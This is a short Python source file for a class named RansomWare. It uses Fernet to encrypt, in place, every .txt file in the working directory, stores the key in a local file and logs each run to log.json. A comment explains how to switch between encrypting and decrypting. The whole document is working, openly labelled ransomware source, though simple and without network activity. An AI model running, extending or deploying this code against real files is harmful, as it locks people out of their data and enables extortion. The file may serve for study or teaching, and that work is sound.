
from cryptography.fernet import Fernet
from os import listdir
from os.path import isfile

import json
import uuid

class RansomWare:
    def __init__(self, key):
        self.key = key
        self.cipher = Fernet(key)

    @staticmethod
    def get_filenames() -> list:
        filenames = []
        for filename in listdir():
            if isfile(filename) and filename.split('.')[1] == "txt": 
                filenames.append(filename)
        return filenames

    @staticmethod
    def read_file(filename: str, mode: str) -> bytes:
        with open(filename, mode) as file:
            content = file.read()
        return content

    @staticmethod
    def write_file(filename: str, content: bytes, mode: str) -> None:
        with open(filename, mode) as file:
            file.write(content)

    def enc_dec(self, isEncrypted: bool):
        filenames = self.get_filenames()
        for filename in filenames:
            token = self.read_file(filename, "rb")
            token = self.cipher.encrypt(token) if not isEncrypted else self.cipher.decrypt(token)
            self.write_file(filename, token, "wb")

        with open("log.json", "r+", encoding="utf-8") as file:
            data = json.load(file)
            data["people"].append({"id": str(uuid.uuid1()), "isEncrypted": (not isEncrypted)})
            file.seek(0)
            json.dump(data, file, ensure_ascii=False, indent=4)

key = b""
with open("key.key", "rb+") as file:
    key = file.read()
    if not key:
        key = Fernet.generate_key()
        file.write(key)

ransomware = RansomWare(key)
ransomware.enc_dec(True) # set False if you want to encrypt | True for decrypting